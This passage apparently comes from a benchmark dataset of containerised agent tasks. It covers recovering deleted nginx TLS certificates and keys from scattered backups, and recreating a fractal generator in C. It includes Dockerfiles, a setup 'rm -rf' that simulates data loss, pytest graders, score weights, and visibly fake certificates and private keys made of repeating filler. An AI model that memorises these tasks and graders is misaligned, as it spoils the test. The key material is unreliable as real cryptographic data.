COPY api-dev.company.com.key /etc/nginx/ssl/

# Create some backups and traces in various locations
RUN cp /etc/nginx/ssl/www.company.com.* /var/backups/nginx/2024-01-15/ && \
    cp /etc/nginx/ssl/api-prod.company.com.* /tmp/ && \
    echo ""-----BEGIN CERTIFICATE-----"" > /var/log/nginx/old_cert_fragment.log && \
    cat /etc/nginx/ssl/api-dev.company.com.crt >> /var/log/nginx/old_cert_fragment.log

# Create a tar backup with some certs using Python's tarfile
RUN python3 -c ""import tarfile; t = tarfile.open('/var/backups/old_certs.tar', 'w'); \
    t.add('/var/backups/nginx/2024-01-15', arcname='nginx/2024-01-15'); t.close()""

# Copy the cert fragment
COPY cert_fragment.txt /tmp/cert_fragment.txt

# Now delete the SSL directory to simulate the accident
RUN rm -rf /etc/nginx/ssl","import os
import subprocess
import glob

def test_certificates_recovered():
    """"""Test that valid certificate files for the required domains are recovered.""""""
    recovered_dir = ""/etc/nginx/ssl_recovered""
    
    # Check directory exists
    assert os.path.exists(recovered_dir), f""Recovery directory {recovered_dir} does not exist""
    
    # Find all .crt files in recovered directory
    crt_files = glob.glob(os.path.join(recovered_dir, ""*.crt""))
    
    # We need at least 3 certificates (www, api-prod, api-dev)
    assert len(crt_files) >= 3, f""Expected at least 3 certificate files, found {len(crt_files)}""
    
    # Check that we have certificates for required domains
    required_domains = [""www.company.com"", ""api-prod.company.com"", ""api-dev.company.com""]
    found_domains = []
    
    for cert_file in crt_files:
        # Use openssl to check the certificate CN
        result = subprocess.run(
            [""openssl"", ""x509"", ""-in"", cert_file, ""-noout"", ""-subject""],
            capture_output=True,
            text=True
        )
        
        if result.returncode == 0:
            # Extract CN from subject
            subject = result.stdout.strip()
            if ""CN="" in subject:
                cn = subject.split(""CN="")[-1].split("","")[0].split(""/"")[0].strip()
                found_domains.append(cn)
    
    # Check all required domains are present
    for domain in required_domains:
        assert domain in found_domains, f""Certificate for {domain} not found in recovered certificates""

def test_keys_match_certificates():
    """"""Test that private keys match their corresponding certificates.""""""
    recovered_dir = ""/etc/nginx/ssl_recovered""
    
    # Find all certificate files
    crt_files = glob.glob(os.path.join(recovered_dir, ""*.crt""))
    
    matched_pairs = 0
    
    for cert_file in crt_files:
        # Derive expected key filename
        base_name = os.path.basename(cert_file).replace('.crt', '')
        key_file = os.path.join(recovered_dir, f""{base_name}.key"")
        
        if os.path.exists(key_file):
            # Get modulus from certificate
            cert_mod_result = subprocess.run(
                [""openssl"", ""x509"", ""-in"", cert_file, ""-noout"", ""-modulus""],
                capture_output=True,
                text=True
            )
            
            # Get modulus from key
            key_mod_result = subprocess.run(
                [""openssl"", ""rsa"", ""-in"", key_file, ""-noout"", ""-modulus""],
                capture_output=True,
                text=True
            )
            
            if cert_mod_result.returncode == 0 and key_mod_result.returncode == 0:
                # Compare moduli
                if cert_mod_result.stdout.strip() == key_mod_result.stdout.strip():
                    matched_pairs += 1
    
    # We should have at least 3 matched certificate/key pairs
    assert matched_pairs >= 3, f""Expected at least 3 matched certificate/key pairs, found {matched_pairs}""","{""test_certificates_recovered"": 0.6, ""test_keys_match_certificates"": 0.4}","{""site2.conf"": ""server {\n    listen 443 ssl http2;\n    server_name api-prod.company.com;\n\n    ssl_certificate /etc/nginx/ssl/api-prod.company.com.crt;\n    ssl_certificate_key /etc/nginx/ssl/api-prod.company.com.key;\n    \n    location / {\n        proxy_pass http://localhost:8080;\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n    }\n}\n\nserver {\n    listen 443 ssl http2;\n    server_name api-dev.company.com;\n\n    ssl_certificate /etc/nginx/ssl/api-dev.company.com.crt;\n    ssl_certificate_key /etc/nginx/ssl/api-dev.company.com.key;\n    \n    location / {\n        proxy_pass http://localhost:8081;\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n    }\n}"", ""api-dev.company.com.crt"": ""-----BEGIN CERTIFICATE-----\nMIIDwTCCAqmgAwIBAgIUDLOMsSwMXcgxQotZQzCKkmZH9hEwDQYJKoZIhvcNAQEL\nBQAwcDELMAkGA1UEBhMCVVMxEzARBgNVBAgMCkNhbGlmb3JuaWExFjAUBgNVBAcM\nDVNhbiBGcmFuY2lzY28xFDASBgNVBAoMC0NvbXBhbnkgSW5jMR4wHAYDVQQDDBVh\ncGktZGV2LmNvbXBhbnkuY29tIENBMB4XDTI0MDEwMTAwMDAwMFoXDTI1MDEwMTAw\nMDAwMFowazELMAkGA1UEBhMCVVMxEzARBgNVBAgMCkNhbGlmb3JuaWExFjAUBgNV\nBAcMDVNhbiBGcmFuY2lzY28xFDASBgNVBAoMC0NvbXBhbnkgSW5jMRkwFwYDVQQD\nDBBhcGktZGV2LmNvbXBhbnkuY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIB\nCgKCAQEAyLOMsSwMXcgxQotZQzCKkmZH9hEyLOMsSwMXcgxQotZQzCKkmZH9hEyL\nOMsSwMXcgxQotZQzCKkmZH9hEyLOMsSwMXcgxQotZQzCKkmZH9hEyLOMsSwMXcgx\nQotZQzCKkmZH9hEyLOMsSwMXcgxQotZQzCKkmZH9hEyLOMsSwMXcgxQotZQzCKkm\nZH9hEyLOMsSwMXcgxQotZQzCKkmZH9hEyLOMsSwMXcgxQotZQzCKkmZH9hEyLOMs\nSwMXcgxQotZQzCKkmZH9hEyLOMsSwMXcgxQotZQzCKkmZH9hEyLOMsSwMXcgxQot\nZQzCKkmZH9hEyLOMsSwMXcgxQotZQzCKkmZH9hEyLOMsSwMXcgxQotZQzCKkmZH9\nhEyLOMsSwMXcgxQotZQzCKkmZH9hEQIDAQABo1MwUTAdBgNVHQ4EFgQUyLOMsSwM\nXcgxQotZQzCKkmZH9hEwHwYDVR0jBBgwFoAUyLOMsSwMXcgxQotZQzCKkmZH9hEw\nDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEALOMsSwMXcgxQotZQ\nzCKkmZH9hEyLOMsSwMXcgxQotZQzCKkmZH9hEyLOMsSwMXcgxQotZQzCKkmZH9hE\nyLOMsSwMXcgxQotZQzCKkmZH9hEyLOMsSwMXcgxQotZQzCKkmZH9hEyLOMsSwMXc\ngxQotZQzCKkmZH9hEyLOMsSwMXcgxQotZQzCKkmZH9hEyLOMsSwMXcgxQotZQzCK\nkmZH9hEyLOMsSwMXcgxQotZQzCKkmQ==\n-----END CERTIFICATE-----"", ""api-prod.company.com.key"": ""-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDRmN3d4hJKwTuZ\nTvM8mWN6PZ3H8kOvJ6eDu3dHr8xOpWkKxZI6OuWRRM7kCwOwC3iOrU6NbGyeMHfV\nSN7lCxPxD3jOpVkKxZI6OuWRRM8mSN7lCxPxD3jKI3juKJK7M4JwCZ+F+X7O8Z9S\noWkKxZI6OuWRRM8mSN7lCxPxD3jOpVkKxZI6OuWpSRH7lCxPxD3jOpVkKxZI6OuW\nRRM8mSN7lCxPxD3jOpVkKxZI6OuWRRM8mSN7lCxPxD3jOpVkKxZI6OuWRRM8mSN7\nlCxPxD3jOpVkKxZI6OuWRRM8mSN7lCxPxD3jOpVkKxZI6OuWRRM8mSN7lCxPxD3j\nOpVkKxZI6OuWRRM8mSN7lCxPxD3jAgMBAAECggEARmN3d4hJKwTuZTvM8mWN6PZ3\nH8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H8kOwR\nmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d4h\nJKwTuZTvM8mWN6PZ3H8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d4hJKwTuZ\nTvM8mWN6PZ3H8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d4hJKwTuZTvM8mW\nN6PZ3H8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H\n8kOwRmN3d4hJKwQKBgQD2RmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d4hJKwTuZT\nvM8mWN6PZ3H8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d4hJKwTuZTvM8mWN\n6PZ3H8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H8\nkOwRmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d4hJKwKBgQDZRmN3d4hJKwTuZTvM\n8mWN6PZ3H8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d4hJKwTuZTvM8mWN6P\nZ3H8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H8kO\nwRmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d\n4hJKwTuZTvM8mQKBgQCRmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d4hJKwTuZTvM\n8mWN6PZ3H8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d4hJKwTuZTvM8mWN6P\nZ3H8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H8kO\nwRmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d4hJKwKBgQCRmN3d4hJKwTuZTvM8mW\nN6PZ3H8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H\n8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRm\nN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d4hJ\nKwTuZTvM8mWN6QKBgFRmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d4hJKwTuZTvM8\nmWN6PZ3H8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d4hJKwTuZTvM8mWN6PZ\n3H8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H8kOw\nRmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d=\n-----END PRIVATE KEY-----"", ""cert_fragment.txt"": ""-----BEGIN CERTIFICATE-----\nMIIDvTCCAqWgAwIBAgIUBHJNxPqLVafvOmrXOxaIkkXF7fwwDQYJKoZIhvcNAQEL\nBQAwbjELMAkGA1UEBhMCVVMxEzARBgNVBAgMCkNhbGlmb3JuaWExFjAUBgNVBAcM\nDVNhbiBGcmFuY2lzY28xFDASBgNVBAoMC0NvbXBhbnkgSW5jMRwwGgYDVQQDDBN3\nd3cuY29tcGFueS5jb20gQ0EwHhcNMjQwMTAxMDAwMDAwWhcNMjUwMTAxMDAwMDAw\nWjBpMQswCQYDVQQGEwJVUzETMBEGA1UECAwKQ2FsaWZvcm5pYTEWMBQGA1UEBwwN\nU2FuIEZyYW5jaXNjbzEUMBIGA1UECgwLQ29tcGFueSBJbmMxFzAVBgNVBAMMDnd3\ndy5jb21wYW55LmNvbTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMqe\n3VzwJx+WGhKvV0K8j9lO7KQtLyNkzH8i0xheuUL8K/oUNF9V2Yh6tXp4VFnXzQkR\n0J8FqvJ4O7Z2fvTnNr8xDpVkJwYH5NvVQM6jBv2iML2HEVS2rKFxQZRcRl+K4k8o\nJH2rK4EYBq9jKjF7M3BvKZ/E9W6N7Y8RnFh8iVQK3tnZ0n5VFkL8o4Z9K2vJ7D3N\noRFK6H5Y/bK8rJ5O8vN2F4QqK8rF5vZ3P7N9KJ2fqRnZ0vF4K8sN3O2vKrJ7F8qL\n3vN8K2rO5vJ7F3NqK8L5vK3O8rF5NvK2r8J5NvO3K8rF5vZ3P7N9KJ2fqRnZ0vJ8\nK5NvO3K8rF5"", ""backup_old.tar"": ""This is a binary tar file that would contain old certificate backups."", ""www.company.com.key"": ""-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDKnt1c8CcflhoS\nr1dCvI/ZTuykLS8jZMx/ItMYXrlC/Cv6FDRfVdmIerV6eFRZ180JEdCfBaryeDu2\ndn705za/MQ6VZCcGB+Tb1UDOowb9ojC9hxFUtqyhcUGUXEZfiuJPKCR9qyuBGAav\nYyoxezNwbymfxPVuje2PEZxYfIlUCt7Z2dJ+VRZC/KOGfStryew9zaERSuh+WP2y\nvKyeTvLzdheEKivKxeb2dz+zfSidn6kZ2dLxeCvLDdztrqyexfKi97zfCtqzuby\nexdzaivC+bytzvKxeTbytq/CeTbztyvKxeb2dz+zfSidn6kZ2dLyfCuTbztyvKxe\nX1dCvI/ZTAgMBAAECggEAXEB7fSidn6kZ2dLyfCuTbztyvKxeb2dz+zfSidn6kZ2d\nLyfCuTbztyvKxeb2dz+zfSidn6kZ2dLyfCuTbztyvKxeb2dz+zfSidn6kZ2dLyfCu\nTbztyvKxeb2dz+zfSidn6kZ2dLyfCuTbztyvKxeb2dz+zfSidn6kZ2dLyfCuTbzty\nvKxeb2dz+zfSidn6kZ2dLyfCuTbztyvKxeb2dz+zfSidn6kZ2dLyfCuTbztyvKxeb\n2dz+zfSidn6kZ2dLyfCuTbztyvKxeb2dz+zfSidn6kZ2dLyfCuTbztyvKxeb2dz+z\nfSidn6kZ2dLyfCuQKBgQDtyvKxeb2dz+zfSidn6kZ2dLyfCuTbztyvKxeb2dz+zfS\nidn6kZ2dLyfCuTbztyvKxeb2dz+zfSidn6kZ2dLyfCuTbztyvKxeb2dz+zfSidn6k\nZ2dLyfCuTbztyvKxeb2dz+zfSidn6kZ2dLyfCuTbztyvKxeb2dz+zfSidn6kZ2dLy\nfCuTbztyvKwKBgQDaztyvKxeb2dz+zfSidn6kZ2dLyfCuTbztyvKxeb2dz+zfSidn\n6kZ2dLyfCuTbztyvKxeb2dz+zfSidn6kZ2dLyfCuTbztyvKxeb2dz+zfSidn6kZ2d\nLyfCuTbztyvKxeb2dz+zfSidn6kZ2dLyfCuTbztyvKxeb2dz+zfSidn6kZ2dLyfCu\nTbztyvKxeb2dz+zQKBgG2dLyfCuTbztyvKxeb2dz+zfSidn6kZ2dLyfCuTbztyvKx\neb2dz+zfSidn6kZ2dLyfCuTbztyvKxeb2dz+zfSidn6kZ2dLyfCuTbztyvKxeb2dz\n+zfSidn6kZ2dLyfCuTbztyvKxeb2dz+zfSidn6kZ2dLyfCuTbztyvKxeb2dz+zfSi\ndn6kZ2dLAoGAFtyvKxeb2dz+zfSidn6kZ2dLyfCuTbztyvKxeb2dz+zfSidn6kZ2d\nLyfCuTbztyvKxeb2dz+zfSidn6kZ2dLyfCuTbztyvKxeb2dz+zfSidn6kZ2dLyfCu\nTbztyvKxeb2dz+zfSidn6kZ2dLyfCuTbztyvKxeb2dz+zfSidn6kZ2dLyfCuTbzty\nvKxeb0CgYEAztyvKxeb2dz+zfSidn6kZ2dLyfCuTbztyvKxeb2dz+zfSidn6kZ2dL\nyfCuTbztyvKxeb2dz+zfSidn6kZ2dLyfCuTbztyvKxeb2dz+zfSidn6kZ2dLyfCuT\nbztyvKxeb2dz+zfSidn6kZ2dLyfCuTbztyvKxeb2dz+zfSidn6kZ2dLyfCuTbztyv\nKxeb2dz+zfSidn6kZ2dLyfCuTbztw=\n-----END PRIVATE KEY-----"", ""api-prod.company.com.crt"": ""-----BEGIN CERTIFICATE-----\nMIIDxTCCAq2gAwIBAgIUCKNMzRsLWbgwOnsYPyBJllYG8g0wDQYJKoZIhvcNAQEL\nBQAwcjELMAkGA1UEBhMCVVMxEzARBgNVBAgMCkNhbGlmb3JuaWExFjAUBgNVBAcM\nDVNhbiBGcmFuY2lzY28xFDASBgNVBAoMC0NvbXBhbnkgSW5jMSAwHgYDVQQDDBdh\ncGktcHJvZC5jb21wYW55LmNvbSBDQTAeFw0yNDAxMDEwMDAwMDBaFw0yNTAxMDEw\nMDAwMDBaMG0xCzAJBgNVBAYTAlVTMRMwEQYDVQQIDApDYWxpZm9ybmlhMRYwFAYD\nVQQHDA1TYW4gRnJhbmNpc2NvMRQwEgYDVQQKDAtDb21wYW55IEluYzEbMBkGA1UE\nAwwSYXBpLXByb2QuY29tcGFueS5jb20wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw\nggEKAoIBAQDRmN3d4hJKwTuZTvM8mWN6PZ3H8kOvJ6eDu3dHr8xOpWkKxZI6OuW\nRRM7kCwOwC3iOrU6NbGyeMHfVSN7lCxPxD3jOpVkKxZI6OuWRRM8mSN7lCxPxD3j\nKI3juKJK7M4JwCZ+F+X7O8Z9SoWkKxZI6OuWRRM8mSN7lCxPxD3jOpVkKxZI6OuW\npSRH7lCxPxD3jOpVkKxZI6OuWRRM8mSN7lCxPxD3jOpVkKxZI6OuWRRM8mSN7lCx\nPxD3jOpVkKxZI6OuWRRM8mSN7lCxPxD3jOpVkKxZI6OuWRRM8mSN7lCxPxD3jOpV\nkKxZI6OuWRRM8mSN7lCxPxD3jOpVkKxZAgMBAAGjUzBRMB0GA1UdDgQWBBQRmN3d\n4hJKwTuZTvM8mWN6PZ3H8kOwHwYDVR0jBBgwFoAURmN3d4hJKwTuZTvM8mWN6PZ3\nH8kOwMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEBAGRmN3d4hJK\nwTuZTvM8mWN6PZ3H8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d4hJKwTuZTvM\n8mWN6PZ3H8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d4hJKwTuZTvM8mWN6P\nZ3H8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H8kOwRmN3d4hJKwTuZTvM8mWN6PZ3H8kO\nwRmN3d4hJKwTuZTvM8mWN6PZ3H8kOw==\n-----END CERTIFICATE-----"", ""api-dev.company.com.key"": ""-----BEGIN PRIVATE KEY-----\nMIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQDIs4yxLAxdyDFC\ni1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIqSZk\nf2ETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxL\nAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1l\nDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIqSZkf2E\nTIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxd\nyDFCi1lDMIqSZkf2ETIs4yxLAxdyDBECAwEAAQKCAQAs4yxLAxdyDFCi1lDMIqSZ\nkf2ETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yx\nLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1\nlDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIqSZkf2\nETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAx\ndyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDM\nIqSZkf2BAoGBAPIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIqSZk\nf2ETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxL\nAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1l\nDMIqSZkf2ETIs4yxLAxdyDFCi1lDAoGBANIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4\nyxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFC\ni1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIqSZk\nf2ETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDAoGAFIs4yxLAxdyD\nFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIqS\nZkf2ETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4y\nxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi\n1lDMIqSZkf2ECgYAUIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIq\nSZkf2ETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4\nyxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFC\ni1lDMIqSZkf2ETIs4yxLAxdyDFCi1QKBgQCIs4yxLAxdyDFCi1lDMIqSZkf2ETIs\n4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDF\nCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIqSZ\nkf2ETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4yxLAxdyDFCi1lDMIqSZkf2ETIs4w=\n-----END PRIVATE KEY-----"", ""generate_certs.sh"": ""#!/bin/bash\n\n# Generate self-signed certificates for testing\n\n# Create private keys\nopenssl genrsa -out www.company.com.key 2048\nopenssl genrsa -out api-prod.company.com.key 2048\nopenssl genrsa -out api-dev.company.com.key 2048\n\n# Create certificate signing requests\nopenssl req -new -key www.company.com.key -out www.company.com.csr -subj \""/C=US/ST=California/L=San Francisco/O=Company Inc/CN=www.company.com\""\nopenssl req -new -key api-prod.company.com.key -out api-prod.company.com.csr -subj \""/C=US/ST=California/L=San Francisco/O=Company Inc/CN=api-prod.company.com\""\nopenssl req -new -key api-dev.company.com.key -out api-dev.company.com.csr -subj \""/C=US/ST=California/L=San Francisco/O=Company Inc/CN=api-dev.company.com\""\n\n# Self-sign the certificates\nopenssl x509 -req -days 365 -in www.company.com.csr -signkey www.company.com.key -out www.company.com.crt\nopenssl x509 -req -days 365 -in api-prod.company.com.csr -signkey api-prod.company.com.key -out api-prod.company.com.crt\nopenssl x509 -req -days 365 -in api-dev.company.com.csr -signkey api-dev.company.com.key -out api-dev.company.com.crt\n\n# Clean up CSRs\nrm *.csr"", ""www.company.com.crt"": ""-----BEGIN CERTIFICATE-----\nMIIDvTCCAqWgAwIBAgIUBHJNxPqLVafvOmrXOxaIkkXF7fwwDQYJKoZIhvcNAQEL\nBQAwbjELMAkGA1UEBhMCVVMxEzARBgNVBAgMCkNhbGlmb3JuaWExFjAUBgNVBAcM\nDVNhbiBGcmFuY2lzY28xFDASBgNVBAoMC0NvbXBhbnkgSW5jMRwwGgYDVQQDDBN3\nd3cuY29tcGFueS5jb20gQ0EwHhcNMjQwMTAxMDAwMDAwWhcNMjUwMTAxMDAwMDAw\nWjBpMQswCQYDVQQGEwJVUzETMBEGA1UECAwKQ2FsaWZvcm5pYTEWMBQGA1UEBwwN\nU2FuIEZyYW5jaXNjbzEUMBIGA1UECgwLQ29tcGFueSBJbmMxFzAVBgNVBAMMDnd3\ndy5jb21wYW55LmNvbTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMqe\n3VzwJx+WGhKvV0K8j9lO7KQtLyNkzH8i0xheuUL8K/oUNF9V2Yh6tXp4VFnXzQkR\n0J8FqvJ4O7Z2fvTnNr8xDpVkJwYH5NvVQM6jBv2iML2HEVS2rKFxQZRcRl+K4k8o\nJH2rK4EYBq9jKjF7M3BvKZ/E9W6N7Y8RnFh8iVQK3tnZ0n5VFkL8o4Z9K2vJ7D3N\noRFK6H5Y/bK8rJ5O8vN2F4QqK8rF5vZ3P7N9KJ2fqRnZ0vF4K8sN3O2vKrJ7F8qL\n3vN8K2rO5vJ7F3NqK8L5vK3O8rF5NvK2r8J5NvO3K8rF5vZ3P7N9KJ2fqRnZ0vJ8\nK5NvO3K8rF5vZ3P7N9CAwEAATANBgkqhkiG9w0BAQsFAAOCAQEArKjF5NvO3K8rF\nvZ3P7N9KJ2fqRnZ0vJ8K5NvO3K8rF5vZ3P7N9KJ2fqRnZ0vJ8K5NvO3K8rF5vZ3P\n7N9KJ2fqRnZ0vJ8K5NvO3K8rF5vZ3P7N9KJ2fqRnZ0vJ8K5NvO3K8rF5vZ3P7N9\nKJ2fqRnZ0vJ8K5NvO3K8rF5vZ3P7N9==\n-----END CERTIFICATE-----"", ""nginx.conf"": ""user www-data;\nworker_processes auto;\npid /run/nginx.pid;\n\nevents {\n    worker_connections 768;\n}\n\nhttp {\n    sendfile on;\n    tcp_nopush on;\n    types_hash_max_size 2048;\n\n    include /etc/nginx/mime.types;\n    default_type application/octet-stream;\n\n    ssl_protocols TLSv1.2 TLSv1.3;\n    ssl_prefer_server_ciphers off;\n\n    access_log /var/log/nginx/access.log;\n    error_log /var/log/nginx/error.log;\n\n    gzip on;\n\n    include /etc/nginx/conf.d/*.conf;\n    include /etc/nginx/sites-enabled/*;\n}"", ""site1.conf"": ""server {\n    listen 443 ssl http2;\n    server_name www.company.com;\n\n    ssl_certificate /etc/nginx/ssl/www.company.com.crt;\n    ssl_certificate_key /etc/nginx/ssl/www.company.com.key;\n    \n    ssl_session_timeout 1d;\n    ssl_session_cache shared:MozSSL:10m;\n    ssl_session_tickets off;\n\n    root /var/www/main;\n    index index.html;\n\n    location / {\n        try_files $uri $uri/ =404;\n    }\n}""}",2025-07-23T09:53:00.514389+00:00,2025-07-23T09:57:42.685120+00:00
draft_dp_00a472fc,medium,draft_dp_00a472fc,software-engineering,The fractal binary generates PPM images but we need the source. Reverse engineer it and recreate the exact algorithm in fractal.c.,software-engineering,C|algorithm-implementation|images,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install numpy

COPY fractal.b64 /app/
COPY decode_fractal.sh /app/
RUN chmod +x /app/decode_fractal.sh && cd /app && ./decode_fractal.sh

CMD [""/bin/bash""]","import subprocess
import os
import numpy as np

def read_ppm(filename):
    """"""Read a PPM P6 file and return as numpy array.""""""
    with open(filename, 'rb') as f:
        header = f.readline().decode('ascii').strip()
        assert header == 'P6', f""Invalid PPM format: {header}""
        
        # Skip comments and read dimensions
        line = f.readline().decode('ascii').strip()
        while line.startswith('#'):
            line = f.readline().decode('ascii').strip()
        
        width, height = map(int, line.split())
        max_val = int(f.readline().decode('ascii').strip())
        assert max_val == 255, f""Unsupported max value: {max_val}""
        
        # Read pixel data
        data = np.frombuffer(f.read(), dtype=np.uint8)
        return data.reshape((height, width, 3))

def compare_images(img1_path, img2_path):
    """"""Compare two PPM images and return mean squared error.""""""
    img1 = read_ppm(img1_path)
    img2 = read_ppm(img2_path)
    
    if img1.shape != img2.shape:
        return float('inf')
    
    mse = np.mean((img1.astype(float) - img2.astype(float)) ** 2) / (255.0 ** 2)
    return mse

def test_mandelbrot_generation():
    """"""Test that fractal.c generates correct Mandelbrot set.""""""
    # Clean up any existing files
    for f in ['fractal.ppm', 'original.ppm', 'recreated.ppm']:
        if os.path.exists(f):
            os.remove(f)
    
    # Generate with original binary
    result = subprocess.run(['./fractal', '1', '100', '1.0'], capture_output=True)
    assert result.returncode == 0, f""Original fractal failed: {result.stderr.decode()}""
    assert os.path.exists('fractal.ppm'), ""Original fractal.ppm not created""
    os.rename('fractal.ppm', 'original.ppm')
    
    # Check if fractal.c exists (agent should create it)
    assert os.path.exists('fractal.c'), ""fractal.c not found""
    
    # Compile the recreated version
    compile_result = subprocess.run(['gcc', '-o', 'fractal_recreated', 'fractal.c', '-lm'], 
                                  capture_output=True)
    assert compile_result.returncode == 0, f""Compilation failed: {compile_result.stderr.decode()}""
    
    # Generate with recreated version
    result = subprocess.run(['./fractal_recreated', '1', '100', '1.0'], capture_output=True)
    assert result.returncode == 0, f""Recreated fractal failed: {result.stderr.decode()}""
    assert os.path.exists('fractal.ppm'), ""Recreated fractal.ppm not created""
    os.rename('fractal.ppm', 'recreated.ppm')
    
    # Compare images
    mse = compare_images('original.ppm', 'recreated.ppm')
    assert mse < 0.01, f""Images differ too much: MSE = {mse}""

def test_julia_and_burning_ship():
    """"""Test Julia set and Burning Ship fractals.""""""
    test_cases = [
        ('2', '50', '2.5'),   # Julia set
        ('3', '150', '0.8')   # Burning Ship
    ]
    
    for fractal_type, iterations, zoom in test_cases:
        # Clean up
        for f in ['fractal.ppm', 'original.ppm', 'recreated.ppm']:
            if os.path.exists(f):
                os.remove(f)
        
        # Generate with original
        result = subprocess.run(['./fractal', fractal_type, iterations, zoom], 
                              capture_output=True)
        assert result.returncode == 0, f""Original failed for type {fractal_type}""
        os.rename('fractal.ppm', 'original.ppm')
        
        # Generate with recreated
        result = subprocess.run(['./fractal_recreated', fractal_type, iterations, zoom], 
                              capture_output=True)
